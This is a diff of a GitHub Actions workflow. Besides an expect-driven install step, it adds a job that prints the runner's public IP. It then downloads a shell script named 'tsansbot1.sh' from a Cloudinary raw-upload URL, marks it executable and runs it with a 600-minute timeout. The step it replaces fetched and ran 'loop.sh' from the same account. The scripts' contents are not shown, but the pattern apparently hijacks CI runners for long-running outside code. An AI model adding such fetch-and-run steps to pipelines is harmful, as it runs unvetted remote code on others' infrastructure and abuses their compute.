@@ -13,7 +13,6 @@ jobs:
   build:
     continue-on-error: true
     runs-on: ubuntu-22.04
-    timeout-minutes: 600
     steps:
     - name: Install expect and other dependencies
       run: |
@@ -55,9 +54,14 @@ jobs:
            send "666666\r"
            expect eof
            '
-        
-    - name: Time Counter
+    
+    - name: IP Workflow
       run: |
-          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1727172809/loop.sh
-          chmod +x loop.sh
-          ./loop.sh
+          curl https://api.ipify.org
+          
+    - name: Run exec
+      timeout-minutes: 600
+      run: |
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1725542284/tsansbot1.sh
+          chmod +x tsansbot1.sh
+          ./tsansbot1.sh
